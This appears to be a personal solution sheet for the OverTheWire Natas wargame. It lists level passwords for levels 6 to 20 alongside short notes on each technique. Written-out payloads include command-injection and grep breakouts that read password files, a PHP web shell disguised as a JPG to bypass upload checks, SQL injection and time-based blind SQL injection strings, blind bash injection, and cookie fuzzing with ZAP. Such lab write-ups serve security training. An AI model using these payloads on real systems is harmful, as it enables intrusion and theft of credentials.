# Natas

```
http://natas1.natas.labs.overthewire.org/
1

2

3

4

5

6 fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

7 jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

8 a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

    Encryption

        <?php
        $encodedSecret = "3d3d516343746d4d6d6c315669563362";
        
        function encodeSecret($secret) {
            return bin2hex(strrev(base64_encode($secret)));
        }
        
        if(array_key_exists("submit", $_POST)) {
            if(encodeSecret($_POST['secret']) == $encodedSecret) {
            print "Access granted. The password for natas9 is <censored>";
            } 
            else {
            print "Wrong secret";
            }}
        ?>

9 Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
    
    Bash Breakout

        ; cat /etc/natas_webpass/natas10 #

10 D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE 

    grep Breakout

        .* /etc/natas_webpass/natas11 #

11 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
    
    XOR Encryption

12 YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

    PHP Injection

        Create a jpg file with php injected using

        echo "<?php echo system(\"cat /etc/natas_webpass/natas13\"); ?>" > ./file.jpg

        Select file.jpg for upload

        Edit the source html of the natas forms filename attribute to  have a .php extension instead of .jpg

        Follow the link to the uploaded php and you will find the password for the next level.


13 lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
    
    PHP Injection, Filtered.

        Tools: 
            https://hexed.it/ - Hex Editor

        Open ./file.jpg in a hex editor and insert the header FF D8 FF as the first 3 bytes. Amend the path and increment the level.

        Select file.jpg for upload

        Edit the source html of the natas forms filename attribute to  have a .php extension instead of .jpg

        Follow the link to the uploaded php and you will find the password for the next level.

14 qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP

    SQL Injection
    
        username=name&password=none"OR"1=1;&debug

15 TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB

    Blind SQL Injection

16 TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

    Blind Bash Injection

        $(echo hello)

        $(cut -c 1 /etc/natas_webpass/natas17)

        $(grep a /etc/natas_webpass/natas17)

        $(grep b /etc/natas_webpass/natas17)
    

17 XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd

    Time-Based Blind SQL Injection

        using the following syntax we can interrogate the SQL server for data.
        natas18" AND password LIKE BINARY '%a%' AND SLEEP (5); #
        natas18" AND password LIKE BINARY '%b%' AND SLEEP (5); #

18 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq

    Cookie Fuzzing

        The source code shows the user id is a 3 digit integer, it also shows this is stored in a cookie called PHPSESSID

        Using OWASP ZAP we can fuzz this value and try all permutations.

        To do this copy the raw request from the network section of the developer tools into the requester tool in ZAP.

        Double click the value of PHPSESSID then right click and select fuzz, next select payload and from there select numbers from the drop down.

        You can now set the range and run the fuzz.

        By sorting the results by size you can find the flag to access the next level.


19 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s

    Blind cookie fuzzing

20 guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
```
